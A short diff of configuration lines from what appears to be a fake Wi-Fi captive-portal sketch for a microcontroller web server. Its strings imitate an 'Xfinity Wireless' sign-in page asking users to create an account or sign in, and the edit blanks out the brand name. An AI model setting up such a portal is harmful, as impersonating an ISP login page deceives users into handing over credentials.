@@ -4,8 +4,8 @@
 #include <WebServer.h>
 
 // User configuration
-#define SSID_NAME "Xfinity Wireless"
-#define SUBTITLE "Xfinity Wireless Portal"
+#define SSID_NAME "________ Wireless"
+#define SUBTITLE "________ Wireless Portal"
 #define TITLE "Sign In/Create Account:"
 #define BODY "Please Sign In/Create Account to continue to the internet."
 #define POST_TITLE "Validating..."
